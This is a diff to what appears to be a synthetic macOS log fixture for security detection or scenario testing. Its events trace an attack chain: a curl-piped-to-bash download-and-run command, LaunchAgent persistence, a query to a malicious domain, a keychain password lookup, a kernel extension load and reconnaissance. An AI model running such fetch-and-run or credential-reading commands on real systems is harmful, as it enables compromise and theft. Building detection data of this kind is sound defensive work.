@@ -1,27 +1,223 @@
-- timestamp: "2025-03-08T18:42:11Z"
+- timestamp: "2025-12-29T16:35:43Z"
   process: Terminal
+  processID: 1234
+  processImagePath: /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal
   subsystem: com.apple.TCC
   category: Access
-  eventMessage: Prompting user for access to Desktop folder
+  eventMessage: Prompting user for access to Desktop folder via kTCCServiceSystemPolicyDesktopFolder
+  composedMessage: TCC prompt for Desktop folder access
   senderImagePath: /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal
+  senderImageUUID: A1B2C3D4-E5F6-7890-ABCD-EF1234567890
+  traceID: "0x1a2b3c4d"
+  bootUUID: "12345678-90AB-CDEF-1234-567890ABCDEF"
+  machTimestamp: 1234567890
+  hostName: macbook-pro.local
+  osVersion: "macOS 14.2 (23C64)"
 
-- timestamp: "2025-03-08T18:42:15Z"
+- timestamp: "2025-12-29T16:36:15Z"
   process: Terminal
+  processID: 1234
+  processImagePath: /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal
   subsystem: com.apple.TCC
   category: Decision
-  eventMessage: User denied access to Desktop folder
+  eventMessage: User denied access to Desktop folder for Terminal.app
+  composedMessage: TCC decision - access denied
   senderImagePath: /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal
+  senderImageUUID: A1B2C3D4-E5F6-7890-ABCD-EF1234567890
+  traceID: "0x1a2b3c4e"
+  bootUUID: "12345678-90AB-CDEF-1234-567890ABCDEF"
+  machTimestamp: 1234567891
+  hostName: macbook-pro.local
+  osVersion: "macOS 14.2 (23C64)"
 
-- timestamp: "2025-03-08T18:44:08Z"
+- timestamp: "2025-12-29T16:42:08Z"
   process: curl
+  processID: 5678
+  processImagePath: /usr/bin/curl
   subsystem: com.apple.network
   category: Network
-  eventMessage: Outgoing HTTPS connection to example.com
+  eventMessage: Outgoing HTTPS connection to https://api.github.com/repos/texasbe2trill/ScenarioKit
+  composedMessage: curl https://api.github.com/repos/texasbe2trill/ScenarioKit -o repo.json
   senderImagePath: /usr/bin/curl
+  senderImageUUID: B2C3D4E5-F6A7-8901-BCDE-F12345678901
+  traceID: "0x2b3c4d5e"
+  bootUUID: "12345678-90AB-CDEF-1234-567890ABCDEF"
+  machTimestamp: 1234567900
+  hostName: macbook-pro.local
+  osVersion: "macOS 14.2 (23C64)"
 
-- timestamp: "2025-03-08T18:44:15Z"
+- timestamp: "2025-12-29T16:44:22Z"
   process: bash
+  processID: 5680
+  processImagePath: /bin/bash
   subsystem: com.apple.shell
   category: Execution
-  eventMessage: Executed script via bash -c
+  eventMessage: Executed script via bash -c 'curl https://raw.githubusercontent.com/setup.sh | bash'
+  composedMessage: Shell command execution detected
   senderImagePath: /bin/bash
+  senderImageUUID: C3D4E5F6-A7B8-9012-CDEF-123456789012
+  traceID: "0x3c4d5e6f"
+  bootUUID: "12345678-90AB-CDEF-1234-567890ABCDEF"
+  machTimestamp: 1234567905
+  hostName: macbook-pro.local
+  osVersion: "macOS 14.2 (23C64)"
+
+- timestamp: "2025-12-29T16:48:45Z"
+  process: launchd
+  processID: 1
+  processImagePath: /sbin/launchd
+  subsystem: com.apple.launchd
+  category: Persistence
+  eventMessage: Loading LaunchAgent from ~/Library/LaunchAgents/com.suspicious.agent.plist
+  composedMessage: LaunchAgent persistence artifact detected
+  senderImagePath: /sbin/launchd
+  senderImageUUID: D4E5F6A7-B8C9-0123-DEF1-234567890123
+  traceID: "0x4d5e6f70"
+  bootUUID: "12345678-90AB-CDEF-1234-567890ABCDEF"
+  machTimestamp: 1234567920
+  hostName: macbook-pro.local
+  osVersion: "macOS 14.2 (23C64)"
+
+- timestamp: "2025-12-29T16:52:30Z"
+  process: mDNSResponder
+  processID: 234
+  processImagePath: /usr/sbin/mDNSResponder
+  subsystem: com.apple.network.dns
+  category: dns
+  eventMessage: DNS query for malicious-domain.com A record
+  composedMessage: DNS resolver activity detected
+  senderImagePath: /usr/sbin/mDNSResponder
+  senderImageUUID: E5F6A7B8-C9D0-1234-EF12-345678901234
+  traceID: "0x5e6f7081"
+  bootUUID: "12345678-90AB-CDEF-1234-567890ABCDEF"
+  machTimestamp: 1234567945
+  hostName: macbook-pro.local
+  osVersion: "macOS 14.2 (23C64)"
+
+- timestamp: "2025-12-29T16:58:10Z"
+  process: syspolicyd
+  processID: 456
+  processImagePath: /usr/libexec/syspolicyd
+  subsystem: com.apple.syspolicy
+  category: GatekeeperBlock
+  eventMessage: Gatekeeper blocked execution of unsigned application from quarantine
+  composedMessage: Syspolicyd blocked malware attempt
+  senderImagePath: /usr/libexec/syspolicyd
+  senderImageUUID: F6A7B8C9-D0E1-2345-F123-456789012345
+  traceID: "0x6f708192"
+  bootUUID: "12345678-90AB-CDEF-1234-567890ABCDEF"
+  machTimestamp: 1234567980
+  hostName: macbook-pro.local
+  osVersion: "macOS 14.2 (23C64)"
+
+- timestamp: "2025-12-29T17:05:22Z"
+  process: sudo
+  processID: 7890
+  processImagePath: /usr/bin/sudo
+  subsystem: com.apple.authorization
+  category: Authentication
+  eventMessage: sudo authentication attempt for user admin with password prompt
+  composedMessage: Privilege escalation via sudo
+  senderImagePath: /usr/bin/sudo
+  senderImageUUID: A7B8C9D0-E1F2-3456-1234-567890123456
+  traceID: "0x7081920a"
+  bootUUID: "12345678-90AB-CDEF-1234-567890ABCDEF"
+  machTimestamp: 1234568020
+  hostName: macbook-pro.local
+  osVersion: "macOS 14.2 (23C64)"
+
+- timestamp: "2025-12-29T17:12:45Z"
+  process: sshd
+  processID: 8901
+  processImagePath: /usr/sbin/sshd
+  subsystem: com.apple.sshd
+  category: Connection
+  eventMessage: Accepted publickey for admin from 192.168.1.100 port 54321 ssh2
+  composedMessage: SSH connection established
+  senderImagePath: /usr/sbin/sshd
+  senderImageUUID: B8C9D0E1-F2A3-4567-2345-678901234567
+  traceID: "0x81920a1b"
+  bootUUID: "12345678-90AB-CDEF-1234-567890ABCDEF"
+  machTimestamp: 1234568065
+  hostName: macbook-pro.local
+  osVersion: "macOS 14.2 (23C64)"
+
+- timestamp: "2025-12-29T17:18:30Z"
+  process: screensharingd
+  processID: 9012
+  processImagePath: /System/Library/CoreServices/RemoteManagement/screensharingd.bundle/Contents/MacOS/screensharingd
+  subsystem: com.apple.screensharing
+  category: RemoteAccess
+  eventMessage: Screen sharing session initiated from 192.168.1.101
+  composedMessage: VNC/screensharing remote access detected
+  senderImagePath: /System/Library/CoreServices/RemoteManagement/screensharingd.bundle/Contents/MacOS/screensharingd
+  senderImageUUID: C9D0E1F2-A3B4-5678-3456-789012345678
+  traceID: "0x920a1b2c"
+  bootUUID: "12345678-90AB-CDEF-1234-567890ABCDEF"
+  machTimestamp: 1234568110
+  hostName: macbook-pro.local
+  osVersion: "macOS 14.2 (23C64)"
+
+- timestamp: "2025-12-29T17:24:15Z"
+  process: kextload
+  processID: 10123
+  processImagePath: /sbin/kextload
+  subsystem: com.apple.kext
+  category: KernelExtension
+  eventMessage: Loading kernel extension com.suspicious.kext.driver
+  composedMessage: Kernel extension loading detected
+  senderImagePath: /sbin/kextload
+  senderImageUUID: D0E1F2A3-B4C5-6789-4567-890123456789
+  traceID: "0xa1b2c3d4"
+  bootUUID: "12345678-90AB-CDEF-1234-567890ABCDEF"
+  machTimestamp: 1234568155
+  hostName: macbook-pro.local
+  osVersion: "macOS 14.2 (23C64)"
+
+- timestamp: "2025-12-29T17:28:50Z"
+  process: security
+  processID: 11234
+  processImagePath: /usr/bin/security
+  subsystem: com.apple.security
+  category: KeychainAccess
+  eventMessage: find-generic-password -a admin -s login.keychain
+  composedMessage: Keychain credential access attempt
+  senderImagePath: /usr/bin/security
+  senderImageUUID: E1F2A3B4-C5D6-7890-5678-901234567890
+  traceID: "0xb2c3d4e5"
+  bootUUID: "12345678-90AB-CDEF-1234-567890ABCDEF"
+  machTimestamp: 1234568180
+  hostName: macbook-pro.local
+  osVersion: "macOS 14.2 (23C64)"
+
+- timestamp: "2025-12-29T17:32:18Z"
+  process: system_profiler
+  processID: 12345
+  processImagePath: /usr/sbin/system_profiler
+  subsystem: com.apple.systeminfo
+  category: Discovery
+  eventMessage: system_profiler SPHardwareDataType SPSoftwareDataType
+  composedMessage: System profiler reconnaissance detected
+  senderImagePath: /usr/sbin/system_profiler
+  senderImageUUID: F2A3B4C5-D6E7-8901-6789-012345678901
+  traceID: "0xc3d4e5f6"
+  bootUUID: "12345678-90AB-CDEF-1234-567890ABCDEF"
+  machTimestamp: 1234568210
+  hostName: macbook-pro.local
+  osVersion: "macOS 14.2 (23C64)"
+
+- timestamp: "2025-12-29T17:35:05Z"
+  process: python3
+  processID: 13456
+  processImagePath: /usr/bin/python3
+  subsystem: com.apple.python
+  category: Execution
+  eventMessage: Executing Python script /tmp/malicious_script.py
+  composedMessage: Suspicious Python script execution
+  senderImagePath: /usr/bin/python3
+  senderImageUUID: A3B4C5D6-E7F8-9012-7890-123456789012
+  traceID: "0xd4e5f6a7"
+  bootUUID: "12345678-90AB-CDEF-1234-567890ABCDEF"
+  machTimestamp: 1234568305
+  hostName: macbook-pro.local
+  osVersion: "macOS 14.2 (23C64)"
